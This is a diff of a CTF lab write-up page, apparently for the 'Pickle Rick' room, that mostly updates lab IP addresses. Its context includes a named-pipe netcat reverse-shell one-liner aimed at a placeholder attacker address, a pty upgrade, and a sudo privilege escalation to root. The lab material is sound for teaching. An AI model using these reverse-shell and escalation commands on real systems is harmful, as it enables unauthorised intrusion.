@@ -82,7 +82,7 @@
                 <pre><code>case@local:~$ sudo nc -lvnp 444
 [sudo] password for case:
 Listening on 0.0.0.0 444
-Connection received on 10.10.43.192 37146
+Connection received on 10.10.236.162 37146
                 </code></pre>
                 <p>Okay, so we can successfully execute a netcat command but we cannot use the "-e" option, which allows us to execute an external program after making the connection. Well, let's just do it manually instead, by creating a named pipe and redirecting stdin, stdout and stderr...</p>
                 <pre><code>mkfifo /tmp/f; nc attacking_ip_address 444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f</code></pre>
@@ -90,36 +90,36 @@ Connection received on 10.10.43.192 37146
                 <pre><code>case@local:~$ sudo nc -lvnp 444
 [sudo] password for case:
 Listening on 0.0.0.0 444
-Connection received on 10.10.43.192 37260
+Connection received on 10.10.236.162 37260
 whoami
 www-data
                 </code></pre>
                 <p>This is a bit clunky however, it doesn't give us a fully-fledged terminal environment. Let us see if we can spawn a pseudo-terminal using Python, to more accurately simulate a real terminal session; we know we are on a Linux box, Python3 is likely installed, let us give it a go...</p>
                 <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
                 <p>It worked a treat...</p>
-                <pre><code>www-data@ip-10-10-43-192:/var/www/html$</code></pre>
-                <p>Let us set the TERM environment variable also, let us set it to "xterm", this will ensure our pseudo terminal behaves correctly, and ensure compatibility with features such as screen clearing..</p>
+                <pre><code>www-data@ip-10-10-236-162:/var/www/html$</code></pre>
+                <p>Let us set the TERM environment variable also, let us set it to "xterm", this will ensure our pseudo terminal behaves correctly, and ensures compatibility with features such as screen clearing..</p>
                 <pre><code>export TERM=xterm</code></pre>
             </section>
 
             <section id="Four">
                 <h2>Step Four - Privilege Escalation</h2>
                 <p>Okay, so we have a stable/interactive reverse shell. We still only have "www-data" privileges. Let see what this user can do with "sudo". Using the command "sudo -l" we get the following output:</p>
-                <pre><code>User www-data may run the following commands on ip-10-10-29-11:
+                <pre><code>User www-data may run the following commands on ip-10-10-236-162:
     (ALL) NOPASSWD: ALL
                 </code></pre>
                 <p>This is now effectively game over. This is telling us that our current logged in user can execute commands as any user, that no password is required to do so, and that we can run any command. We can simply escalate to root now by executing "sudo /bin/bash". We are now root!</p>
-                <pre><code>root@ip-10-10-20-11:/var/www/html#</code></pre>
+                <pre><code>root@ip-10-10-236-161:/var/www/html#</code></pre>
             </section>
             
             <section id="solution">
                 <h2>Solution</h2>
                 <p>First flag is here:</p>
-                <pre><code>root@ip-10-10-29-11:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt</code></pre>
+                <pre><code>root@ip-10-10-236-162:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt</code></pre>
                 <p>The second flag is here:</p>
-                <pre><code>root@ip-10-10-29-11:/home/rick# cat 'second ingredients'</code></pre>
+                <pre><code>root@ip-10-10-236-162:/home/rick# cat 'second ingredients'</code></pre>
                 <p>The final flag I found in this file here:</p>
-                <pre><code>root@ip-10-10-29-11:/home/ubuntu# nano .bash_history</code></pre>
+                <pre><code>root@ip-10-10-236-162:/home/ubuntu# nano .bash_history</code></pre>
             </section>
             
             <section id="conclusion">
